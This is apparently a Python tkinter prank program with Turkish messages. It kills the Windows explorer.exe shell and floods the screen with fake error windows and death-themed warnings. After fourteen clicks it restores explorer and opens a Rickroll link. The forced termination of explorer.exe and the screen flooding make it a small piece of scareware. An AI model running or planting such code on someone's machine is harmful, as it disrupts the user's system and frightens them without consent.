# Copyright (C) 2023 Muhammed S. (MuKonqi)
# License: MIT License

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

from tkinter import *
from tkinter import messagebox
import time
import webbrowser
import os
import random
os.system("taskkill /IM explorer.exe /F")
s=0
while True:
    def private():
        webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    def error():
        for w in range(10):
            window2=Toplevel()
            window2.title("BABA HATA: "+str(w))
            window2.resizable(0, 0)
            window2.geometry("1000x1000")
    def run():
        global s
        if s != 14:
            s=s+1
            if s == 1:
                global tic
                tic = time.time()
            messagebox.showwarning("Ah be...","Geberdiniz, Allah rahmet eylesin.")
            window.attributes("-fullscreen", False)
            error()
            window.attributes("-fullscreen", True)
            messagebox.showerror("explorer.exe","\n:::{9543-3258-6574-1628-1331-0408}\nClass Not Registired")
            #button.config(text=str(s)+". Ölüm")
            button.place(relx=str(random.uniform(0.2, 0.8)), rely=str(random.uniform(0.2, 0.8)))
        else:
            messagebox.showinfo("Tebrikler", "Mezarınıza kavuştunuz.")
            toc = time.time()
            t = str(toc-tic)
            os.system("explorer.exe")
            button.config(text="ÇOK GİZLİ DOSYA", command=private)
            button.place(relx=0.5, rely=0.5)
    window=Tk(className="ANA HATA")
    window.config(background="#376296")
    window.title("ANA HATA")
    window.resizable(0, 0)
    window.attributes("-fullscreen", True)
    button=Button(window, command=run, text="BANA TIKLAMA\nYOKSA ÖLERSİN", font="arial 50 bold italic")
    button.place(relx=0.5, rely=0.5, anchor = CENTER)
    for w in range(100):
        window2=Toplevel()
        window2.title("BABA HATA: "+str(w))
        window2.resizable(0, 0)
        window2.geometry("1000x1000")
    mainloop()
